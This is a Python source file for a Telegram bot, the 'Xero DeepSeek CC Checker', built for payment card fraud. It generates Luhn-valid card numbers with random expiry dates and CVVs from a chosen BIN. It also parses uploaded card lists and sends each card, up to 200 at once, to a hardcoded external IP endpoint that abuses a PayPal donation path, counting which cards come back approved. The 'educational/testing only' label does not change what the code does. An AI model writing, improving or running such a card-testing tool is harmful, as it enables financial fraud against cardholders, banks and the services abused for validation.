#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Xero DeepSeek – Ultimate CC Checker Bot v3.1 (fixed & enhanced)
# For educational/testing purposes only.

import asyncio
import logging
import random
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from threading import Lock
from typing import List, Optional

import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ========== CONFIGURATION ==========
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"          # Replace with your token
API_URL = "http://199.244.48.163:8025/paypal_donate?cc={}"
MAX_WORKERS = 200                               # max concurrent API calls
TIMEOUT = 15                                    # HTTP request timeout
# ===================================

# ---------- Thread-safe global state ----------
class BotState:
    def __init__(self):
        self.lock = Lock()
        self.active = False
        self.bin = "414720"                     # default BIN
        self.generation_limit = 10000           # 0 = unlimited
        self.counters = {"checked": 0, "declined": 0, "approved": 0, "errors": 0}
        self.executor: Optional[ThreadPoolExecutor] = None

state = BotState()

# ---------- Luhn Algorithm (check digit) ----------
def luhn_checksum(partial: str) -> int:
    """
    Compute Luhn check digit for a partial number (without the last digit).
    Returns the digit (0-9) to append to make a valid number.
    """
    digits = [int(d) for d in partial]
    for i in range(len(digits) - 1, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] -= 9
    total = sum(digits)
    return (10 - (total % 10)) % 10

def generate_card(bin_prefix: str, month: str = None, year: str = None, cvv: str = None) -> str:
    """
    Generates a valid credit card number with random account digits.
    Format: CC|MM|YYYY|CVV
    """
    # Ensure BIN is exactly 6 digits (pad or truncate)
    bin_part = bin_prefix.ljust(6, '0')[:6]
    # Generate random 9-digit account number (positions 7–15)
    account = ''.join(str(random.randint(0, 9)) for _ in range(9))
    partial = bin_part + account
    check_digit = luhn_checksum(partial + '0')   # compute check digit for 16-digit number
    cc = partial + str(check_digit)

    if not month:
        month = str(random.randint(1, 12)).zfill(2)
    if not year:
        year = str(random.randint(2026, 2030))
    if not cvv:
        cvv = str(random.randint(100, 999))

    return f"{cc}|{month}|{year}|{cvv}"

def fix_year(yy: str) -> str:
    """Convert 2-digit year to 4-digit (assumes 20xx)."""
    return '20' + yy if len(yy) == 2 else yy

# ---------- API Caller ----------
def check_card(card: str) -> dict:
    """Calls the donation API and returns the parsed response."""
    url = API_URL.format(card)
    try:
        resp = requests.get(url, timeout=TIMEOUT)
        resp.raise_for_status()
        data = resp.json()
        status = data.get("status", "UNKNOWN").upper()
        return {"card": card, "status": status, "raw": data}
    except Exception as e:
        return {"card": card, "status": "ERROR", "error": str(e)}

def process_cards(cards: List[str]):
    """
    Check a batch of cards using a thread pool.
    Updates global counters under lock.
    """
    if not state.executor:
        raise RuntimeError("Executor not initialized")
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        state.executor = executor   # allow stop() to shut it down
        futures = {executor.submit(check_card, c): c for c in cards}
        for future in as_completed(futures):
            # Allow early exit if operation was stopped externally
            if not state.active:
                break
            res = future.result()
            with state.lock:
                state.counters["checked"] += 1
                if res["status"] == "DECLINED":
                    state.counters["declined"] += 1
                elif res["status"] == "APPROVED":
                    state.counters["approved"] += 1
                else:
                    state.counters["errors"] += 1

# ---------- Dashboard ----------
def dashboard_message() -> str:
    with state.lock:
        c = state.counters
    return (
        f"📊 **Live Dashboard**\n"
        f"BIN: `{state.bin}` | Target: `{state.generation_limit if state.generation_limit != 0 else '∞'}`\n"
        f"Checked: `{c['checked']}`\n"
        f"Declined: `{c['declined']}` | Approved: `{c['approved']}` | Errors: `{c['errors']}`"
    )

# ---------- Telegram Handlers ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "**Xero DeepSeek CC Checker**\n\n"
        "/start – Show this help\n"
        "/setbin `<BIN>` – Set BIN prefix (default 414720)\n"
        "/targetchk `<num>` – Set generation target (0 = unlimited)\n"
        "/gen – Start auto‑generation & checking\n"
        "/mchk – Reply to a .txt file with cards (format: CC|MM|YY|CVV)\n"
        "/status – Show current settings & counters\n"
        "/reset – Reset counters without stopping\n"
        "/stop – Stop any running operation\n\n"
        "⚠️ *For educational/testing only.*"
    )
    await update.message.reply_text(help_text, parse_mode="Markdown")

async def setbin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /setbin <BIN>")
        return
    raw = context.args[0].strip()
    if not raw.isdigit() or len(raw) < 6:
        await update.message.reply_text("BIN must be at least 6 digits.")
        return
    state.bin = raw[:6]  # take first 6
    await update.message.reply_text(f"✅ BIN set to `{state.bin}`", parse_mode="Markdown")

async def targetchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set the generation limit."""
    if not context.args:
        await update.message.reply_text("Usage: /targetchk <amount> (0 = unlimited)")
        return
    try:
        limit = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid number.")
        return
    if limit < 0:
        await update.message.reply_text("❌ Must be >= 0.")
        return
    state.generation_limit = limit
    await update.message.reply_text(f"✅ Target set to `{limit}` cards.", parse_mode="Markdown")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(dashboard_message(), parse_mode="Markdown")

async def reset_counters(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with state.lock:
        state.counters = {"checked": 0, "declined": 0, "approved": 0, "errors": 0}
    await update.message.reply_text("♻️ Counters reset.")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state.active = False
    if state.executor:
        state.executor.shutdown(wait=False)
        state.executor = None
    await update.message.reply_text("⏹️ Operation stopped.")

async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check from a .txt file (reply to a document)."""
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("📂 Please reply to a .txt file containing CCs.")
        return

    doc = update.message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Only .txt files are accepted.")
        return

    try:
        file = await context.bot.get_file(doc.file_id)
        content = (await file.download_as_bytearray()).decode('utf-8')
    except Exception as e:
        await update.message.reply_text(f"❌ Could not download file: {e}")
        return

    cards = []
    for line in content.splitlines():
        line = line.strip()
        if not line or '|' not in line:
            continue
        parts = line.split('|')
        if len(parts) < 4:
            continue
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        yy = fix_year(yy)
        cards.append(f"{cc}|{mm}|{yy}|{cvv}")

    if not cards:
        await update.message.reply_text("⚠️ No valid CC lines found.")
        return

    state.counters = {"checked": 0, "declined": 0, "approved": 0, "errors": 0}
    state.active = True
    await update.message.reply_text(f"⚡ Mass check of `{len(cards)}` cards started...\n{dashboard_message()}",
                                    parse_mode="Markdown")

    loop = asyncio.get_running_loop()
    # Run blocking work in a thread, keep the bot responsive
    await loop.run_in_executor(None, process_cards, cards)
    state.active = False
    await update.message.reply_text(f"✅ Mass check completed.\n{dashboard_message()}", parse_mode="Markdown")

async def start_generation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Begin auto‑generating cards for the current BIN and checking them."""
    if state.active:
        await update.message.reply_text("⚠️ Already running. Use /stop first.")
        return

    state.counters = {"checked": 0, "declined": 0, "approved": 0, "errors": 0}
    state.active = True
    limit = state.generation_limit

    await update.message.reply_text(
        f"🔥 Generation started with BIN `{state.bin}` (target: {limit if limit != 0 else '∞'})...\n"
        f"{dashboard_message()}",
        parse_mode="Markdown"
    )

    # Run the generator loop in a separate thread to keep the bot alive
    loop = asyncio.get_running_loop()
    batch_size = 1000
    total = 0

    def run():
        nonlocal total
        while state.active and (limit == 0 or total < limit):
            current_batch = [
                generate_card(state.bin)
                for _ in range(min(batch_size, limit - total) if limit != 0 else batch_size)
            ]
            process_cards(current_batch)   # blocking call inside thread
            total += len(current_batch)
        state.active = False

    await loop.run_in_executor(None, run)
    await update.message.reply_text(f"🏁 Generation finished. {dashboard_message()}", parse_mode="Markdown")

# ---------- Main ----------
def main():
    logging.basicConfig(
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        level=logging.INFO
    )
    app = Application.builder().token(BOT_TOKEN).build()

    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", start))
    app.add_handler(CommandHandler("setbin", setbin))
    app.add_handler(CommandHandler("targetchk", targetchk))
    app.add_handler(CommandHandler("gen", start_generation))   # separate start command
    app.add_handler(CommandHandler("mchk", mchk))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("reset", reset_counters))
    app.add_handler(CommandHandler("stop", stop))

    print("🤖 Bot is running... (Press Ctrl+C to stop)")
    app.run_polling()

if __name__ == "__main__":
    main()
